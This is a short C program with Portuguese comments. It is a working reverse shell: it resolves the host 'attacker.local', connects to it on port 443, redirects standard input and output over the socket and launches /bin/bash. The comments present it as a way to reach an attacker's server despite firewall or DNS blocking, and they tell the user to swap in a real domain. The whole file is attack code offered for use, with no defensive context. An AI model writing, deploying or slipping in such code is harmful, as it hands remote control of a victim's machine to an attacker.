#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>

// Esse código é um bypass de DNS, ele resolve o nome de domínio e conecta ao endereço IP
// Ele é usado para conectar ao servidor de atacante, que pode estar em uma rede local ou na internet
// Ele é uma alternativa ao DNS, que pode ser bloqueada por firewalls
// Fornece flexibilidade para conectar ao servidor de atacante, mesmo que o domínio esteja bloqueado

int main() {
int rede;
struct sockaddr_in atacante;
struct hostent *host;
char *dominio = "attacker.local"; // Mude para seu domínio real ou local

// Resolve o nome de domínio
host = gethostbyname(dominio);
if (host == NULL) {
	fprintf(stderr, "Erro ao resolver domínio %s\n", dominio);
	exit(1);

}
// Prepara conexão
rede = socket(AF_INET, SOCK_STREAM, 0);
if (rede < 0) {
	perror("Erro ao criar socket");
	exit(1);

}

atacante.sin_family = AF_INET;
atacante.sin_port = htons(443);
atacante.sin_addr = *((struct in_addr *) host->h_addr);
// Conecta ao endereço resolvido

if (connect(rede, (struct sockaddr *)&atacante, sizeof(atacante)) < 0) {
	perror("Erro ao conectar");
	exit(1);
}

dup2(rede, 0); dup2(rede, 1); dup2(rede, 2);

execl("/bin/bash", "sh", NULL);

}
